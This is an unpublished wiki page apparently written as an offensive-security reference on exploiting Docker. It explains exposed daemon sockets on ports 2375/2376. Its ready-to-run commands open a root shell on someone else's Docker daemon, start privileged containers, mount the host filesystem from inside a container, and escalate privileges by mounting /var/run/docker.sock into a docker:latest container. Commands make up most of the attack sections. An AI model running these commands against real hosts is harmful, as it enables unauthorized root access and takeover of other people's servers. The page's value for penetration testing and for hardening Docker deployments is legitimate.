---
title: Docker Exploitation
description: Tactics, techniques, and procedures (TTPs) observed and tested in the wild on the exploitation of the Docker application
published: false
date: 2021-01-016T19:14:00.643Z
tags:
editor: markdown
dateCreated: 2021-01-16T16:51:39.351Z
---

# Docker Exploitation

Docker Client Documentation: https://docs.docker.com

## Intent

This page will discuss different tactics, techniques, and procedures (TTPs) observed and tested in the wild on the exploitation of the Docker application  

## Background

A virtual machine: This is a machine within a machine. VirtualBox, VMware, HyperV and other platforms are used to make a machine within a machine. Hard drives, operating systems, ram allocations and all.

A container: This shares the kernel of the operating system to run basically alongside of the host processes. i.e., ‘Docker run a webserver but don’t allocate 20 gbs of space and just pipe the logs from the server into my log directory in my home directory’.

### Docker Socket Vulnerability

When you’re installing Docker you’re actually installing a daemon socket onto your system that talks to the kernel over a tcp:// call. By default, this is setup with either ports 2375 (unencrypted) or 2376 (tls encrypted traffic). This is otherwise known as the docker socket. This socket handles all the API requests that a Docker client makes to the machine. For example, it will send to your internal socket the command `docker ps -a` and show you all of the running containers and subsequent information. At this point this is only going to be accessible to the local machine.

So, let’s say a web developer Bob decides that he want’s to run his applications in a cloud environment and have everything running on docker. Well, you could just ssh into the box install docker and install the apps to run in their own containers. But to streamline product releases he decides to expose the docker daemon to the internet so he can run commands on it from his home office. (docker -H tcp://<some IP>:2375 …)  This is where the vulnerability is…Tenable calls it ‘Docker Daemon Publicly Accessible’ (or something like that). I call it opening a shell up to the internet for anyone to connect to as root…Let’s break it down.

Figure 1:

Running a container on a local machine:

`docker run -it ubuntu:latest`

Running a container with elevated privileges on your local machine:

`docker run -it –privileged ubuntu:latest`

Running a container on someone else’s machine with elevated privileges:

`docker -H <someone else’s IP>:<port> run -it –privileged ubuntu:latest`

There it is…that is the vulnerability. A gross misconfiguration of the Docker daemon that exposes it to the internet (or intranet of a company) if put into a cloud environment or allowed egress. Also with the  `--privileged` flag you’re given root access to the container which can be used in a plethora of privilege escalation attacks.

## Exposed Docker Socket exploitation


### Getting a shell

```
docker run -H tcp://<some_ip>:<port> -it --entrypoint="/bin/sh" alpine
```
Simply creates a container onto a host exposing the docker daemon over TCP.

### Getting a privileged shell


```
docker run -H tcp://<some_ip>:<port> -it --privileged --entrypoint="/bin/sh" alpine
```
Add `--privileged` tag to the above script to allow for all capabilities to be enabled.

A list of which can be found here: https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities

### Mount Host File System To Containers

*** !!! WARNING !!! If you do not know what you are doing you can cause damage to the host machine. Use Caution! ***  


First run a privileged container running alpine.

**Remote:**
```
docker run -H tcp://<some_ip>:<port> -it --privileged --entrypoint="/bin/sh" alpine
```

**Local:**
```
docker run -it --privileged --entrypoint="/bin/sh" alpine
```

Next you'll be greeted with the shell that's running in alpine that is running as the `root (#)` user.

**Create a folder to mount host file system**
```
# mkdir /media/host-mnt
```

**Check for drive names**
```
# df -a
```

*Examples: /dev/sda1, /dev/nvme0, /dev/hdd0*

**Mount the Host FS**

```
# mount -a /dev/<drive> /media/host-mnt && cd /media/host-mnt && ls -lash
```


This should (pardoning any errors with mount or resources being busy) give you read write access to the host's filesystem.

### Docker container within Docker running Docker

Docker Hub Src: https://hub.docker.com/_/docker

Recently Docker released an image on dockerhub that is Docker running itself.

(As weird as that sounds...)

This leads to an interesting privesc vulnerability.

Say you're on a box but don't have access to root and see that you can create unpriviledged containers. (Research this...)

You can create your own docker daemon install that runs on the same socket as the host.

```
$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock docker:latest
```

This opens up a docker container that has docker installed that can create images using the same docker daemon (or socket if exploiting remote).

Once you create the container you should be running as root and can create privileged containers from within an **unpriviledged** container. (idk why people think this is okay.)

```
# docker run -it --privileged alpine
```

Now you have a root shell running in a container that has all of the capabilities enabled as referenced here: https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities
